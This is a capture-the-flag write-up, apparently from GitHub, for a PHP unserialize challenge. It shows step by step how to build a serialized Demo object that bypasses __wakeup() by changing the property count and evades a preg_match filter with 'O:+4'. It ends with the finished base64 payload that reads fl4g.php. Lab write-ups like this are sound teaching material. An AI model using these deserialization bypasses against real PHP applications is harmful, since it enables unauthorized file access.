# Web_php_unserialize

![Screenshot from 2021-07-24 23-30-57](https://user-images.githubusercontent.com/87865134/126874978-4c16dc54-e4bb-4771-ae28-7d471f8ab6ff.png)

- **Hint:** flag in file fl4g.php
- **Workflow:**
  -  get value of `$_GET['var']`
  -  `base64_decode()`
  -  filter by `preg_match()`
  -  unserialize object

- **Payload need:**
  - `base64_encode()` 
  - bypass filter
  - bypass unserialize
  
1. **Bypass unserialize**
  - Create object serialize:
  ```php
  $a = new Demo("fl4g.php");
  $ser = serialize($a);
  echo $ser;
  //result: O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";} 
  ```
  - Bypass `__wakeup()`:
  ```php
  $ser = str_replace(':1:', ':2:', $ser);
  //O:4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}
  ```
2. **Bypass filter `preg_match()`**
  ```php
  $ser = str_replace('O:4', 'O:+4', $ser);
  //O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}
  ```
3. **Endcode base64**  
  `echo base64_encode($ser)`

4. **Get payload:** `TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==` 
5. **Submit payload with URL query parameter**

![Screenshot from 2021-07-24 23-42-14](https://user-images.githubusercontent.com/87865134/126875292-0f129544-1c46-4fd4-824e-b0bb1975676f.png)

- **Description:**
  - > category: Unsecure Deserialization
